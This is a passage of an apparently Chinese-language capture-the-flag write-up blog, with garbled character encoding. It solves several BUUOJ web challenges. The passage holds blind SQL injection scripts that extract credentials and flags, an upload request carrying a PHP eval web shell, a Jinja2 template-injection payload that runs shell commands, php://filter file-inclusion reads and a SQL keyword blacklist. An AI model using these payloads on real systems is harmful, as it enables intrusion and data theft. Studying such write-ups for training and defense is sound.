</span></span><span style=display:flex><span>$path<span style=color:#f92672>=</span><span style=color:#a6e22e>str_replace</span>(<span style=color:#66d9ef>array</span>(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>0&#34;</span>,<span style=color:#e6db74>&#34;%00&#34;</span>,<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#39;&#34;</span>,<span style=color:#e6db74>&#34;&#39;&#34;</span>),<span style=color:#e6db74>&#34;&#34;</span>,$path);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$result<span style=color:#f92672>=</span><span style=color:#a6e22e>mysqli_query</span>($con,<span style=color:#e6db74>&#34;select * from images where id=&#39;</span><span style=color:#e6db74>{</span>$id<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39; or path=&#39;</span><span style=color:#e6db74>{</span>$path<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;&#34;</span>);
</span></span><span style=display:flex><span>$row<span style=color:#f92672>=</span><span style=color:#a6e22e>mysqli_fetch_array</span>($result,<span style=color:#a6e22e>MYSQLI_ASSOC</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$path<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;./&#34;</span> <span style=color:#f92672>.</span> $row[<span style=color:#e6db74>&#34;path&#34;</span>];
</span></span><span style=display:flex><span><span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#34;Content-Type: image/jpeg&#34;</span>);
</span></span><span style=display:flex><span><span style=color:#a6e22e>readfile</span>($path);
</span></span></code></pre></div><pre tabindex=0><code>?id=\0&amp;path=or sleep(3)#
</code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># -*- coding:utf-8 -*-</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Author: 0raN9e</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Challenge: [CISCN2019 æ€»å†³èµ› Day2 Web1]Easyweb</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> requests
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>url<span style=color:#f92672>=</span><span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;http://92ccbb87-37f4-41ee-997a-ea7b050c8832.node5.buuoj.cn:81/image.php?id=</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>0&amp;path=&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>flag <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>50</span>):
</span></span><span style=display:flex><span>    head, tail <span style=color:#f92672>=</span> <span style=color:#ae81ff>32</span>, <span style=color:#ae81ff>127</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span> head <span style=color:#f92672>&lt;</span> tail:
</span></span><span style=display:flex><span>        mid <span style=color:#f92672>=</span> (head <span style=color:#f92672>+</span> tail) <span style=color:#f92672>//</span> <span style=color:#ae81ff>2</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>#payload = f&#39;or (ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),{i},1))&gt;{mid})--+&#39;</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>#images,users</span>
</span></span><span style=display:flex><span>        payload <span style=color:#f92672>=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;or (ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=0x7573657273)),</span><span style=color:#e6db74>{</span>i<span style=color:#e6db74>}</span><span style=color:#e6db74>,1))&gt;</span><span style=color:#e6db74>{</span>mid<span style=color:#e6db74>}</span><span style=color:#e6db74>)--+&#34;</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e># ç”±äºè¿‡æ»¤äº†å¼•å·ï¼Œå¯ä»¥ä½¿ç”¨åå…­è¿›åˆ¶è½¬åŒ–</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>#username,password</span>
</span></span><span style=display:flex><span>        payload <span style=color:#f92672>=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;or (ascii(substr((select(group_concat(username,0x7e,password))from(users)),</span><span style=color:#e6db74>{</span>i<span style=color:#e6db74>}</span><span style=color:#e6db74>,1))&gt;</span><span style=color:#e6db74>{</span>mid<span style=color:#e6db74>}</span><span style=color:#e6db74>)--+&#34;</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>#admin~af0a41e139a4c2257392</span>
</span></span><span style=display:flex><span>        r <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>get(url <span style=color:#f92672>+</span> payload)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#39;JFIF&#39;</span> <span style=color:#f92672>in</span> r<span style=color:#f92672>.</span>text:
</span></span><span style=display:flex><span>            head <span style=color:#f92672>=</span> mid <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>            tail <span style=color:#f92672>=</span> mid
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        mid <span style=color:#f92672>=</span> (head <span style=color:#f92672>+</span> tail) <span style=color:#f92672>//</span> <span style=color:#ae81ff>2</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    flag <span style=color:#f92672>+=</span> chr(mid)
</span></span><span style=display:flex><span>    print(flag)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> head <span style=color:#f92672>==</span> <span style=color:#ae81ff>32</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>break</span>
</span></span></code></pre></div><p>çŸ¥é“å¯†ç åç™»å½•ï¼Œç„¶åä¼ é©¬</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>POST /upload.php HTTP/1.1
</span></span><span style=display:flex><span>Host: 92ccbb87-37f4-41ee-997a-ea7b050c8832.node5.buuoj.cn:81
</span></span><span style=display:flex><span>Content-Length: <span style=color:#ae81ff>328</span>
</span></span><span style=display:flex><span>Cache-Control: max-age<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>Origin: http://92ccbb87-37f4-41ee-997a-ea7b050c8832.node5.buuoj.cn:81
</span></span><span style=display:flex><span>Content-Type: multipart/form-data; boundary<span style=color:#f92672>=</span>----WebKitFormBoundaryURK54xKsm3nKRxB5
</span></span><span style=display:flex><span>Upgrade-Insecure-Requests: <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>User-Agent: Mozilla/5.0 <span style=color:#f92672>(</span>Windows NT 10.0; Win64; x64<span style=color:#f92672>)</span> AppleWebKit/537.36 <span style=color:#f92672>(</span>KHTML, like Gecko<span style=color:#f92672>)</span> Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0
</span></span><span style=display:flex><span>Accept: text/html,application/xhtml+xml,application/xml;q<span style=color:#f92672>=</span>0.9,image/avif,image/webp,image/apng,*/*;q<span style=color:#f92672>=</span>0.8,application/signed-exchange;v<span style=color:#f92672>=</span>b3;q<span style=color:#f92672>=</span>0.7
</span></span><span style=display:flex><span>Referer: http://92ccbb87-37f4-41ee-997a-ea7b050c8832.node5.buuoj.cn:81/user.php
</span></span><span style=display:flex><span>Accept-Encoding: gzip, deflate
</span></span><span style=display:flex><span>Accept-Language: zh-CN,zh;q<span style=color:#f92672>=</span>0.9,en;q<span style=color:#f92672>=</span>0.8,en-GB;q<span style=color:#f92672>=</span>0.7,en-US;q<span style=color:#f92672>=</span>0.6
</span></span><span style=display:flex><span>Cookie: username<span style=color:#f92672>=</span>QE5FDx4%3D
</span></span><span style=display:flex><span>Connection: close
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>------WebKitFormBoundaryURK54xKsm3nKRxB5
</span></span><span style=display:flex><span>Content-Disposition: form-data; name<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;file&#34;</span>; filename<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;&lt;?= @eval(</span>$_POST<span style=color:#e6db74>[&#39;cmd&#39;]);?&gt;&#34;</span>
</span></span><span style=display:flex><span>Content-Type: image/png
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>&lt;?php @eval<span style=color:#f92672>(</span>$_POST<span style=color:#f92672>[</span><span style=color:#e6db74>&#39;cmd&#39;</span><span style=color:#f92672>])</span>;?&gt;
</span></span><span style=display:flex><span>------WebKitFormBoundaryURK54xKsm3nKRxB5
</span></span><span style=display:flex><span>Content-Disposition: form-data; name<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;submit&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Submit
</span></span><span style=display:flex><span>------WebKitFormBoundaryURK54xKsm3nKRxB5--
</span></span></code></pre></div><p>æœ€åèšå‰‘è¿æ¥</p><h2 id=gyctf2020ezsqli>[GYCTF2020]Ezsqli</h2><p>ç”¨bpç®€å•fuzzä¸€ä¸‹çœ‹çœ‹</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#f92672>||</span><span style=color:#ae81ff>1</span><span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#ae81ff>2</span><span style=color:#f92672>||</span><span style=color:#ae81ff>1</span><span style=color:#f92672>=</span><span style=color:#ae81ff>2</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#ae81ff>2</span><span style=color:#f92672>||</span><span style=color:#66d9ef>length</span>(<span style=color:#66d9ef>database</span>())<span style=color:#f92672>&gt;</span><span style=color:#ae81ff>1</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#ae81ff>2</span><span style=color:#f92672>||</span><span style=color:#66d9ef>length</span>(<span style=color:#66d9ef>database</span>())<span style=color:#f92672>&gt;</span><span style=color:#ae81ff>100</span>
</span></span></code></pre></div><p>æ£€æµ‹å®Œäº†ï¼Œå¦‚æœå‡ºNU1Lè¯´æ˜ä¸ºçœŸï¼Œå‡ºç°V&amp;Nä¸ºå‡</p><p><code>sys.schema_table_statistics_with_buffer</code> æ˜¯ MySQL ä¸­çš„ä¸€ä¸ªç³»ç»Ÿè§†å›¾ï¼Œé€šå¸¸ç”¨äºå­˜å‚¨å…³äºæ•°æ®åº“ä¸­è¡¨çš„ç»Ÿè®¡ä¿¡æ¯ï¼Œç‰¹åˆ«æ˜¯ä¸æŸ¥è¯¢ä¼˜åŒ–ç›¸å…³çš„æ•°æ®ã€‚è¿™ä¸ªè§†å›¾åŒ…å«äº†è¡¨çš„å„ç§ç»Ÿè®¡æ•°æ®ï¼Œå¦‚è¡Œæ•°ã€ç´¢å¼•å¤§å°ã€è¡¨çš„å­˜å‚¨å¼•æ“ç­‰ä¿¡æ¯ï¼Œé€šå¸¸ç”± MySQL å†…éƒ¨çš„æŸ¥è¯¢ä¼˜åŒ–å™¨ç”¨æ¥å†³å®šæŸ¥è¯¢è®¡åˆ’ã€‚</p><p><code>sys.x$schema_flattened_keys</code> æ˜¯ MySQL ä¸­çš„ä¸€ä¸ªå†…éƒ¨è§†å›¾ï¼Œä¸»è¦ç”¨äºæ˜¾ç¤ºæ•°æ®åº“ä¸­è¡¨çš„é”®ï¼ˆkeyï¼‰ä¿¡æ¯ï¼Œé€šå¸¸ä¸è¡¨ç»“æ„å’Œç´¢å¼•ç›¸å…³ã€‚å®ƒå±äº <code>sys</code> åº“çš„ä¸€éƒ¨åˆ†ï¼Œ<code>sys</code> åº“æ˜¯ MySQL æä¾›çš„ä¸€ä¸ªç”¨äºæ”¶é›†ç³»ç»Ÿçº§æ•°æ®å’Œè¯Šæ–­çš„ç‰¹æ®Šæ•°æ®åº“ã€‚è¿™ä¸ªè§†å›¾çš„ä½œç”¨æ˜¯æä¾›å…³äºæ•°æ®åº“ä¸­çš„é”®ï¼ˆå¦‚ä¸»é”®ã€å¤–é”®ã€å”¯ä¸€ç´¢å¼•ç­‰ï¼‰çš„è¯¦ç»†ä¿¡æ¯ï¼Œé€šå¸¸ç”¨äºæ•°æ®åº“çš„æ€§èƒ½è°ƒä¼˜å’ŒæŸ¥è¯¢ä¼˜åŒ–ã€‚</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># -*- coding:utf-8 -*-</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Author: 0raN9e</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Challenge: [GYCTF2020]Ezsqli</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> requests
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>url <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;http://a3a2eb96-6ded-4948-bd48-e46b6320dae7.node5.buuoj.cn:81/index.php&#39;</span>
</span></span><span style=display:flex><span>flag <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>500</span>):
</span></span><span style=display:flex><span>    head, tail <span style=color:#f92672>=</span> <span style=color:#ae81ff>32</span>, <span style=color:#ae81ff>127</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span> head <span style=color:#f92672>&lt;=</span> tail:
</span></span><span style=display:flex><span>        mid <span style=color:#f92672>=</span> (head <span style=color:#f92672>+</span> tail) <span style=color:#f92672>//</span><span style=color:#ae81ff>2</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>#payload=f&#34;2||(ascii(substr(database(),{i},1))&gt;{mid})&#34;</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>#payload=f&#34;2||(ascii(substr((select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database()),{i},1))&gt;{mid})&#34;</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>#payload=f&#34;2||(ascii(substr((select group_concat(table_name) from sys.x$schema_flattened_keys where table_schema=database()),{i},1))&gt;{mid})&#34;</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e># f1ag_1s_h3r3_hhhhh,users233333333333333</span>
</span></span><span style=display:flex><span>        payload<span style=color:#f92672>=</span><span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;2||(ascii(substr((select group_concat(flag) from f1ag_1s_h3r3_hhhhh ),</span><span style=color:#e6db74>{</span>i<span style=color:#e6db74>}</span><span style=color:#e6db74>,1))&gt;</span><span style=color:#e6db74>{</span>mid<span style=color:#e6db74>}</span><span style=color:#e6db74>)&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        data <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#39;id&#39;</span>: payload}
</span></span><span style=display:flex><span>        r <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>post(url, data<span style=color:#f92672>=</span>data)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#39;Nu1L&#39;</span> <span style=color:#f92672>in</span> r<span style=color:#f92672>.</span>text:
</span></span><span style=display:flex><span>            head <span style=color:#f92672>=</span> mid <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>            tail <span style=color:#f92672>=</span> mid <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        mid <span style=color:#f92672>=</span> (head <span style=color:#f92672>+</span> tail) <span style=color:#f92672>//</span> <span style=color:#ae81ff>2</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    flag <span style=color:#f92672>+=</span> chr(head)
</span></span><span style=display:flex><span>    print(flag)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> head <span style=color:#f92672>==</span> <span style=color:#ae81ff>32</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>break</span>
</span></span></code></pre></div><h2 id=rootersctf2019i_3_flask>[RootersCTF2019]I_&lt;3_Flask</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>http://c67b8621-8868-4bd5-9238-bef8af2358d1.node5.buuoj.cn:81/?name<span style=color:#f92672>={{</span>7*7<span style=color:#f92672>}}</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>http:<span style=color:#f92672>//</span>c67b8621<span style=color:#f92672>-</span><span style=color:#ae81ff>8868</span><span style=color:#f92672>-</span><span style=color:#ae81ff>4</span>bd5<span style=color:#f92672>-</span><span style=color:#ae81ff>9238</span><span style=color:#f92672>-</span>bef8af2358d1<span style=color:#f92672>.</span>node5<span style=color:#f92672>.</span>buuoj<span style=color:#f92672>.</span>cn:<span style=color:#ae81ff>81</span><span style=color:#f92672>/</span><span style=color:#960050;background-color:#1e0010>?</span>name<span style=color:#f92672>=</span>{{cycler<span style=color:#f92672>.</span>next[<span style=color:#e6db74>&#39;__g&#39;&#39;lobals__&#39;</span>]<span style=color:#f92672>.</span>__builtins__<span style=color:#f92672>.</span>__import__(<span style=color:#e6db74>&#39;os&#39;</span>)<span style=color:#f92672>.</span>popen(<span style=color:#e6db74>&#39;cat flag.txt&#39;</span>)<span style=color:#f92672>.</span>read()}}
</span></span></code></pre></div><h2 id=npuctf2020ezinclude>[NPUCTF2020]ezinclude</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span><span style=color:#75715e>&lt;!--md5($secret.$name)===$pass --&gt;</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>/?name<span style=color:#f92672>=</span><span style=color:#ae81ff>2</span>
</span></span></code></pre></div><p>å‘ç°cookieå€¼è¿™è¾¹hashä¼šå˜</p><p>æ ¹æ®æç¤ºmd5(s e c r e t . secret.secret.name)===pass ï¼Œæˆ‘ä»¬çš„hashå€¼å¾ˆæœ‰å¯èƒ½æ˜¯md5(secret.$name)ï¼Œå¦‚æœå‚æ•°passä¼ å…¥cookiesé‡Œé¢çš„hashå€¼ï¼Œå¯èƒ½å°±ä¼šæˆåŠŸã€‚</p><pre tabindex=0><code>?pass=576322dd496b99d07b5b0f7fa7934a25&amp;name=1
</code></pre><pre tabindex=0><code>/flflflflag.php
</code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>view-source:http://ae8c0a4f-c9dd-4db8-a848-a964c20de0c6.node5.buuoj.cn:81/flflflflag.php?file<span style=color:#f92672>=</span>php://filter/read<span style=color:#f92672>=</span>convert.base64-encode/resource<span style=color:#f92672>=</span>flflflflag.php
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>$file<span style=color:#f92672>=</span>$_GET[<span style=color:#e6db74>&#39;file&#39;</span>];
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#39;/data|input|zip/is&#39;</span>,$file)){
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#39;nonono&#39;</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#f92672>@</span><span style=color:#66d9ef>include</span>($file);
</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#39;include($_GET[&#34;file&#34;])&#39;</span>;
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><p>æ‰«ä¸€ä¸‹</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>http://ae8c0a4f-c9dd-4db8-a848-a964c20de0c6.node5.buuoj.cn:81/flflflflag.php?file<span style=color:#f92672>=</span>php://filter/read<span style=color:#f92672>=</span>convert.base64-encode/resource<span style=color:#f92672>=</span>dir.php
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>var_dump</span>(<span style=color:#a6e22e>scandir</span>(<span style=color:#e6db74>&#39;/tmp&#39;</span>));
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> requests
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> io <span style=color:#f92672>import</span> BytesIO
</span></span><span style=display:flex><span>payload <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&lt;?php phpinfo()?&gt;&#34;</span>
</span></span><span style=display:flex><span>file_data <span style=color:#f92672>=</span> { <span style=color:#e6db74>&#39;file&#39;</span>: BytesIO(payload<span style=color:#f92672>.</span>encode()) }
</span></span><span style=display:flex><span>url <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;http://ae8c0a4f-c9dd-4db8-a848-a964c20de0c6.node5.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&#34;</span>
</span></span><span style=display:flex><span>r <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>post(url<span style=color:#f92672>=</span>url, files<span style=color:#f92672>=</span>file_data, allow_redirects<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>)
</span></span></code></pre></div><p>å»dir.phpçœ‹ä¸€ä¸‹å…·ä½“æ–‡ä»¶</p><pre tabindex=0><code>ae8c0a4f-c9dd-4db8-a848-a964c20de0c6.node5.buuoj.cn:81/flflflflag.php?file=/tmp/phpiEiNTa
</code></pre><p>æœä¸€ä¸‹flag{</p><p>åˆ©ç”¨php7 segment faultç‰¹æ€§ï¼ˆCVE-2018-14884)</p><h2 id=nctf2019sqli>[NCTF2019]SQLi</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span>sqlquery : <span style=color:#66d9ef>select</span> <span style=color:#f92672>*</span> <span style=color:#66d9ef>from</span> users <span style=color:#66d9ef>where</span> username<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;&#39;</span> <span style=color:#66d9ef>and</span> passwd<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;&#39;</span>
</span></span></code></pre></div><p>æµ‹äº†åŠå¤©æ²¡æµ‹å‡ºæ¥ï¼Œçœ‹çœ‹wp</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>POST /index.php HTTP/1.1
</span></span><span style=display:flex><span>Host: 2c767a3f-d8ee-4bfd-8111-79eadee4bde4.node5.buuoj.cn:81
</span></span><span style=display:flex><span>Cache-Control: max-age<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>Accept-Encoding: gzip, deflate
</span></span><span style=display:flex><span>Upgrade-Insecure-Requests: <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>User-Agent: Mozilla/5.0 <span style=color:#f92672>(</span>Windows NT 10.0; Win64; x64<span style=color:#f92672>)</span> AppleWebKit/537.36 <span style=color:#f92672>(</span>KHTML, like Gecko<span style=color:#f92672>)</span> Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0
</span></span><span style=display:flex><span>Referer: http://2c767a3f-d8ee-4bfd-8111-79eadee4bde4.node5.buuoj.cn:81/
</span></span><span style=display:flex><span>Origin: http://2c767a3f-d8ee-4bfd-8111-79eadee4bde4.node5.buuoj.cn:81
</span></span><span style=display:flex><span>Content-Type: application/x-www-form-urlencoded
</span></span><span style=display:flex><span>Accept: text/html,application/xhtml+xml,application/xml;q<span style=color:#f92672>=</span>0.9,image/avif,image/webp,image/apng,*/*;q<span style=color:#f92672>=</span>0.8,application/signed-exchange;v<span style=color:#f92672>=</span>b3;q<span style=color:#f92672>=</span>0.7
</span></span><span style=display:flex><span>Accept-Language: zh-CN,zh;q<span style=color:#f92672>=</span>0.9,en;q<span style=color:#f92672>=</span>0.8,en-GB;q<span style=color:#f92672>=</span>0.7,en-US;q<span style=color:#f92672>=</span>0.6
</span></span><span style=display:flex><span>Content-Length: <span style=color:#ae81ff>74</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>username<span style=color:#f92672>=</span><span style=color:#ae81ff>\&amp;</span>passwd<span style=color:#f92672>=||</span>/**/1;%00
</span></span></code></pre></div><p>%00è¿™æ˜¯ä¸€ä¸ª <strong>NULL å­—ç¬¦</strong>ï¼Œç”¨äºç»ˆæ­¢å­—ç¬¦ä¸²ã€‚åœ¨ä¸€äº›æ•°æ®åº“ç³»ç»Ÿä¸­ï¼Œ<code>%00</code> ä¼šç»ˆæ­¢å­—ç¬¦ä¸²å¤„ç†ï¼Œé€šå¸¸ç”¨æ¥é¿å¼€æŸäº›å­—ç¬¦ä¸²é•¿åº¦æ£€æŸ¥ã€‚</p><p>å¯ä»¥å‘ç°è·³è½¬åˆ°welcome.phpäº†</p><p>çœ‹ä¸€ä¸‹robots.txtï¼Œé‡Œé¢æŒ‡å‘hint.txt</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span>$black_list <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;/limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\&#39;|=| |in|&lt;|&gt;|-|\.|\(\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep/i&#34;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>If</span> $_POST[<span style=color:#e6db74>&#39;passwd&#39;</span>] <span style=color:#f92672>===</span> <span style=color:#a6e22e>admin</span><span style=color:#960050;background-color:#1e0010>&#39;</span><span style=color:#a6e22e>s</span> <span style=color:#a6e22e>password</span>,
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>Then</span> <span style=color:#a6e22e>you</span> <span style=color:#a6e22e>will</span> <span style=color:#a6e22e>get</span> <span style=color:#a6e22e>the</span> <span style=color:#a6e22e>flag</span>;
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># -*- coding:utf-8 -*-</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Author: 0raN9e</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> requests
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> urllib <span style=color:#f92672>import</span> parse
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> string
</span></span><span style=display:flex><span>url <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;http://2c767a3f-d8ee-4bfd-8111-79eadee4bde4.node5.buuoj.cn:81/&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>num <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>result <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>
